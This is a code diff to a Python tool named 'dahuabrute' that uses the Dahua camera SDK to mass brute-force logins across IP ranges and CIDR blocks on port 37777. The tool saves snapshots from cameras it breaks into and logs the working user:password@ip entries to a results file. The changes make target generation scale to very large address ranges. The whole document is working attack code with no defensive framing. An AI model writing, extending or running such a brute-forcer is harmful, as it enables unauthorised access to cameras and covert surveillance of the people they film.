@@ -205,6 +205,7 @@ def get_device_info(login_id):
             if model == "": model = "Unknown"
             if cfg.byTalkOutChanNum > 0: speaker = True
             if cfg.byTalkInChanNum > 0 or cfg.byAudioCaptureNum > 0: mic = True
+        
         ptz_buf = (ctypes.c_byte * 256)()
         ptz_ret = ctypes.c_int(0)
         ptz_res = sdk.CLIENT_QueryDevState(C_LLONG(login_id), QUERY_PTZ_LOCATION, ctypes.cast(ptz_buf, ctypes.c_char_p), 256, ctypes.byref(ptz_ret), 2000)
@@ -277,7 +278,8 @@ def attempt_login(ip, port, user, password, output_dir):
             if snap_ok:
                 debug_log(f"Snapshot saved for {ip}")
                 with res_file_lock:
-                    with open("results.txt", "a") as rf:
+                    results_path = os.path.join(output_dir, "results.txt")
+                    with open(results_path, "a") as rf:
                         rf.write(f"{user}:{password}@{ip}:{port} [{model}] [{capabilities.replace(':', '_')}]\n")
             else:
                 debug_log(f"Snapshot failed for {ip} (all methods)")
@@ -336,42 +338,72 @@ def signal_handler(sig, frame):
         cprint("lightgray", "[*] Interrupted by user! Stopping...")
         os._exit(1)
 
-def parse_targets(target_str):
+def parse_targets_generator(target_str):
     try:
         target_str = target_str.strip()
-        if not target_str: return []
+        if not target_str: return
         if '-' in target_str:
-            start_ip, end_ip = target_str.split('-')
-            start = ipaddress.IPv4Address(start_ip.strip())
-            end = ipaddress.IPv4Address(end_ip.strip())
-            return [str(ipaddress.IPv4Address(ip)) for ip in range(int(start), int(end) + 1)]
+            parts = target_str.split('-')
+            start_ip = parts[0].strip()
+            end_ip = parts[1].strip()
+            start_int = int(ipaddress.IPv4Address(start_ip))
+            end_int = int(ipaddress.IPv4Address(end_ip))
+            for ip_int in range(start_int, end_int + 1):
+                yield str(ipaddress.IPv4Address(ip_int)), 37777
         elif '/' in target_str:
             net = ipaddress.IPv4Network(target_str, strict=False)
-            return [str(ip) for ip in net.hosts()]
+            for ip in net.hosts():
+                yield str(ip), 37777
         elif ':' in target_str:
-            ip, _ = target_str.split(':')
+            ip, port = target_str.split(':')
             ipaddress.IPv4Address(ip)
-            return [target_str]
+            yield ip, int(port)
         else:
             ipaddress.IPv4Address(target_str)
-            return [target_str]
-    except: return None
+            yield target_str, 37777
+    except: pass
 
-def validate_files(args):
-    if not os.path.exists(args.input):
-        cprint("lightred", f"[!] {args.input} not found!"); return False
-    targets = []
-    with open(args.input, 'r') as f:
-        lines = f.readlines()
-        if not lines: cprint("lightred", f"[!] {args.input} is empty!"); return False
-        for i, line in enumerate(lines):
+def count_targets(filename):
+    total = 0
+    try:
+        with open(filename, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if not line: continue
+                try:
+                    target_str = line
+                    if '-' in target_str:
+                        parts = target_str.split('-')
+                        start = int(ipaddress.IPv4Address(parts[0].strip()))
+                        end = int(ipaddress.IPv4Address(parts[1].strip()))
+                        total += (end - start + 1)
+                    elif '/' in target_str:
+                        net = ipaddress.IPv4Network(target_str, strict=False)
+                        if net.prefixlen == 32: total += 1
+                        elif net.prefixlen == 31: total += 2
+                        else: total += (net.num_addresses - 2)
+                    else:
+                        total += 1
+                except: pass
+    except: pass
+    return total
+
+def file_target_generator(filename):
+    with open(filename, 'r') as f:
+        for line in f:
             line = line.strip()
             if not line: continue
-            expanded = parse_targets(line)
-            if expanded is None: cprint("lightred", f"[!] {args.input} invalid format - line: {i+1}!"); return False
-            targets.extend(expanded)
-    if not targets: cprint("lightred", f"[!] {args.input} has no valid targets!"); return False
-    stats["total"] = len(targets)
+            yield from parse_targets_generator(line)
+
+def validate_files_fast(args):
+    if not os.path.exists(args.input):
+        cprint("lightred", f"[!] {args.input} not found!"); return False
+    
+    cprint("lightgray", "[*] Counting targets...")
+    total = count_targets(args.input)
+    if total == 0: cprint("lightred", f"[!] {args.input} has no valid targets!"); return False
+    stats["total"] = total
+    
     if not os.path.exists(args.creds): cprint("lightred", f"[!] creds.cfg not found!"); return False
     with open(args.creds, 'r') as f:
         lines = f.readlines()
@@ -380,12 +412,13 @@ def validate_files(args):
             line = line.strip()
             if not line: continue
             if ":" not in line: cprint("lightred", f"[!] creds.cfg invalid format - line: {i+1}!"); return False
+    
     if os.path.exists(args.output):
         if not os.access(args.output, os.W_OK): cprint("lightred", f"[!] {args.output} Already exists and read-only!"); return False
     else:
         try: os.makedirs(args.output)
         except: cprint("lightred", f"[!] {args.output} Cannot be created!"); return False
-    return targets
+    return True
 
 def main():
     parser = argparse.ArgumentParser(add_help=False)
@@ -407,8 +440,9 @@ def main():
         cprint("lightgray", "-? [Help]")
         return
     cprint("lightblue", "[~] dahuabrute")
-    targets = validate_files(args)
-    if not targets: return
+    
+    if not validate_files_fast(args): return
+    
     global sdk
     try:
         sdk = load_sdk()
@@ -416,33 +450,43 @@ def main():
         sdk.CLIENT_Login.restype = C_LLONG
         sdk.CLIENT_Init(None, None); sdk.CLIENT_SetSnapRevCallBack(c_snap_callback, 0)
     except Exception as e: cprint("lightred", f"[!] SDK Initialization failed: {e}"); return
+    
     cprint("lightgray", f"[+] Input: {args.input}")
     cprint("lightgray", f"[+] Output: {args.output}")
     cprint("lightgray", f"[+] Threads: {args.threads}")
     cprint("lightgray", f"[+] Hosts: {stats['total']}")
     sys.stdout.write('\n')
+    
     signal.signal(signal.SIGINT, signal_handler)
     with open(args.creds, "r") as f:
         credentials = [l.strip() for l in f if ":" in l]
+    
     running = set(); last_update = 0.0
+    target_gen = file_target_generator(args.input)
+    
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        it = iter(targets)
         def submit_next():
             try:
-                line = next(it)
-                if ":" in line: ip, port = line.split(":")
-                else: ip, port = line, 37777
-                fut = executor.submit(process_target, ip, int(port), credentials, args.output)
+                result = next(target_gen)
+                if not result: return False
+                ip, port = result
+                fut = executor.submit(process_target, ip, port, credentials, args.output)
                 running.add(fut); return True
             except StopIteration: return False
-        for _ in range(min(args.threads * 2, len(targets))): submit_next()
+            except Exception: return True
+        
+        for _ in range(args.threads * 2):
+            if not submit_next(): break
+            
         while running and not stop_event.is_set():
             done, _ = wait(running, timeout=0.05, return_when=FIRST_COMPLETED)
             for fut in done:
-                running.discard(fut); submit_next()
+                running.discard(fut)
+                submit_next()
             now = time.time()
             if now - last_update >= 0.1 and not interrupted_by_user:
                 print_progress_once(); last_update = now
+                
     if not interrupted_by_user:
         print_progress_once(); sys.stdout.write('\n')
         cprint("lightgreen", "[+] Scan complete! Stopping...")
